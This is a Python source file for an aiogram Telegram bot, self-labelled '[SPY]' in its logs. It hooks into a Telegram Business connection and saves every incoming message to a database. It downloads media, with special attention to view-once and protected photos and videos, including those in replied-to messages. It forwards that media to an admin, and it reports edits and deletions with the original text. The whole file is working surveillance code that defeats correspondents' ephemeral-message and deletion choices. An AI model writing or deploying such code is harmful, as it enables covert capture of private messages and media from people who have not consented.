from aiogram import Router, Bot, F
from aiogram.types import Message, BusinessConnection, BusinessMessagesDeleted, ContentType
from config import ADMIN_ID, user_states
from utils.database import save_message, get_message, save_event
import os

router = Router()

MEDIA_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "media")
os.makedirs(MEDIA_DIR, exist_ok=True)


@router.business_connection()
async def on_business_connection(connection: BusinessConnection, bot: Bot):
    user_id = connection.user.id
    if connection.is_enabled:
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["business"] = True
        print(f"[SPY] Business connection enabled for {user_id}")
        try:
            await bot.send_message(
                ADMIN_ID,
                f"✅ Business-подключение активно\n"
                f"Пользователь: {connection.user.full_name} (ID: {user_id})"
            )
        except Exception:
            pass
    else:
        if user_id in user_states:
            user_states[user_id]["business"] = False
        print(f"[SPY] Business connection disabled for {user_id}")


@router.business_message()
async def on_business_message(message: Message, bot: Bot):
    """Сохраняем все сообщения + скачиваем медиа (в т.ч. view-once)"""
    chat_id = message.chat.id
    msg_id = message.message_id
    user = message.from_user
    full_name = user.full_name if user else "Unknown"
    username = user.username if user else None
    user_id = user.id if user else 0
    date_str = message.date.isoformat() if message.date else None

    text = message.text or message.caption or ""
    media_type = None
    media_file_id = None
    is_view_once = False
    saved_path = None

    # Определяем тип медиа
    if message.photo:
        media_type = "photo"
        media_file_id = message.photo[-1].file_id
        is_view_once = getattr(message, "has_protected_content", False) or False
    elif message.video:
        media_type = "video"
        media_file_id = message.video.file_id
        is_view_once = getattr(message.video, "has_spoiler", False) or getattr(message, "has_protected_content", False)
    elif message.video_note:
        media_type = "video_note"
        media_file_id = message.video_note.file_id
    elif message.voice:
        media_type = "voice"
        media_file_id = message.voice.file_id
    elif message.audio:
        media_type = "audio"
        media_file_id = message.audio.file_id
    elif message.document:
        media_type = "document"
        media_file_id = message.document.file_id
    elif message.animation:
        media_type = "animation"
        media_file_id = message.animation.file_id
    elif message.sticker:
        media_type = "sticker"
        media_file_id = message.sticker.file_id

    # Пытаемся скачать медиа (особенно важно для view-once)
    if media_file_id:
        try:
            file = await bot.get_file(media_file_id)
            ext = "bin"
            if media_type == "photo":
                ext = "jpg"
            elif media_type in ("video", "video_note", "animation"):
                ext = "mp4"
            elif media_type == "voice":
                ext = "ogg"
            elif media_type == "audio":
                ext = "mp3"
            elif media_type == "sticker":
                ext = "webp"

            filename = f"{chat_id}_{msg_id}_{media_type}.{ext}"
            saved_path = os.path.join(MEDIA_DIR, filename)
            await bot.download_file(file.file_path, saved_path)
        except Exception as e:
            print(f"[SPY] Не удалось скачать медиа: {e}")
            saved_path = None

    # Сохраняем в базу
    await save_message(
        chat_id=chat_id,
        message_id=msg_id,
        user_id=user_id,
        username=username,
        full_name=full_name,
        text=text or f"[{media_type or 'unknown'}]",
        media_type=media_type,
        media_file_id=media_file_id,
        is_view_once=is_view_once,
        date=date_str
    )

    # Если это view-once / одноразовое — сразу уведомляем админа и пересылаем
    if is_view_once or media_type in ("video_note",):
        try:
            caption = (
                f"👁 <b>Одноразовое / кружок сохранено</b>\n\n"
                f"От: {full_name}\n"
                f"Тип: {media_type}\n"
                f"Чат ID: <code>{chat_id}</code>"
            )
            if saved_path and os.path.exists(saved_path):
                if media_type == "photo":
                    await bot.send_photo(ADMIN_ID, photo=open(saved_path, "rb"), caption=caption, parse_mode="HTML")
                elif media_type in ("video", "video_note", "animation"):
                    await bot.send_video(ADMIN_ID, video=open(saved_path, "rb"), caption=caption, parse_mode="HTML")
                elif media_type == "voice":
                    await bot.send_voice(ADMIN_ID, voice=open(saved_path, "rb"), caption=caption, parse_mode="HTML")
                else:
                    await bot.send_document(ADMIN_ID, document=open(saved_path, "rb"), caption=caption, parse_mode="HTML")
            else:
                await bot.send_message(ADMIN_ID, caption + "\n\n⚠️ Файл не удалось скачать", parse_mode="HTML")
        except Exception as e:
            print(f"[SPY] Ошибка отправки одноразового медиа: {e}")

    # === Сохранение одноразового медиа при ОТВЕТЕ на него ===
    if message.reply_to_message:
        replied = message.reply_to_message
        r_media_type = None
        r_file_id = None
        r_is_view_once = getattr(replied, "has_protected_content", False)

        if replied.photo:
            r_media_type = "photo"
            r_file_id = replied.photo[-1].file_id
        elif replied.video:
            r_media_type = "video"
            r_file_id = replied.video.file_id
            r_is_view_once = r_is_view_once or getattr(replied.video, "has_spoiler", False)
        elif replied.video_note:
            r_media_type = "video_note"
            r_file_id = replied.video_note.file_id
        elif replied.voice:
            r_media_type = "voice"
            r_file_id = replied.voice.file_id
        elif replied.animation:
            r_media_type = "animation"
            r_file_id = replied.animation.file_id
        elif replied.document:
            r_media_type = "document"
            r_file_id = replied.document.file_id

        if r_file_id and (r_is_view_once or r_media_type in ("video_note", "photo", "video")):
            try:
                file = await bot.get_file(r_file_id)
                ext = "bin"
                if r_media_type == "photo":
                    ext = "jpg"
                elif r_media_type in ("video", "video_note", "animation"):
                    ext = "mp4"
                elif r_media_type == "voice":
                    ext = "ogg"

                filename = f"reply_{chat_id}_{replied.message_id}_{r_media_type}.{ext}"
                r_path = os.path.join(MEDIA_DIR, filename)
                await bot.download_file(file.file_path, r_path)

                r_full_name = replied.from_user.full_name if replied.from_user else "Unknown"
                caption = (
                    f"💾 <b>Сохранено по ответу</b>\n\n"
                    f"От: {r_full_name}\n"
                    f"Тип: {r_media_type}\n"
                    f"{'👁 Одноразовое' if r_is_view_once else ''}\n"
                    f"Чат ID: <code>{chat_id}</code>"
                )

                if r_media_type == "photo":
                    await bot.send_photo(ADMIN_ID, photo=open(r_path, "rb"), caption=caption, parse_mode="HTML")
                elif r_media_type in ("video", "video_note", "animation"):
                    await bot.send_video(ADMIN_ID, video=open(r_path, "rb"), caption=caption, parse_mode="HTML")
                elif r_media_type == "voice":
                    await bot.send_voice(ADMIN_ID, voice=open(r_path, "rb"), caption=caption, parse_mode="HTML")
                else:
                    await bot.send_document(ADMIN_ID, document=open(r_path, "rb"), caption=caption, parse_mode="HTML")
            except Exception as e:
                print(f"[SPY] Не удалось сохранить медиа из ответа: {e}")


@router.edited_business_message()
async def on_edited_business_message(message: Message, bot: Bot):
    chat_id = message.chat.id
    msg_id = message.message_id
    old = await get_message(chat_id, msg_id)
    old_text = old.get("text", "неизвестно") if old else "неизвестно"
    new_text = message.text or message.caption or "[медиа]"
    full_name = message.from_user.full_name if message.from_user else "Unknown"
    date_str = message.date.isoformat() if message.date else None

    # Обновляем запись
    await save_message(
        chat_id=chat_id,
        message_id=msg_id,
        user_id=message.from_user.id if message.from_user else 0,
        username=message.from_user.username if message.from_user else None,
        full_name=full_name,
        text=new_text,
        date=date_str
    )

    await save_event(chat_id, msg_id, "edit", old_text, new_text, full_name, date_str)

    notify = (
        f"✏️ <b>Сообщение отредактировано</b>\n\n"
        f"<b>Было:</b>\n<code>{old_text[:600]}</code>\n\n"
        f"<b>Стало:</b>\n<code>{new_text[:600]}</code>\n\n"
        f"От: {full_name}\n"
        f"Чат ID: <code>{chat_id}</code>"
    )
    try:
        await bot.send_message(ADMIN_ID, notify, parse_mode="HTML")
    except Exception as e:
        print(f"[SPY] Не удалось отправить уведомление о редактировании: {e}")


@router.deleted_business_messages()
async def on_deleted_business_messages(event: BusinessMessagesDeleted, bot: Bot):
    chat_id = event.chat.id
    for msg_id in event.message_ids:
        cached = await get_message(chat_id, msg_id)
        if cached:
            text = cached.get("text", "[нет текста]")
            full_name = cached.get("full_name", "Unknown")
            media_type = cached.get("media_type")
            await save_event(chat_id, msg_id, "delete", text, None, full_name)

            notify = (
                f"🗑 <b>Сообщение удалено</b>\n\n"
                f"<b>Текст:</b>\n<code>{text[:800]}</code>\n\n"
                f"От: {full_name}\n"
                f"Тип медиа: {media_type or 'текст'}\n"
                f"Чат ID: <code>{chat_id}</code>"
            )
            try:
                await bot.send_message(ADMIN_ID, notify, parse_mode="HTML")
            except Exception as e:
                print(f"[SPY] Ошибка уведомления об удалении: {e}")
        else:
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🗑 Сообщение удалено (ID: {msg_id})\nЧат: <code>{chat_id}</code>\nТекст не был в кэше.",
                    parse_mode="HTML"
                )
            except Exception:
                pass
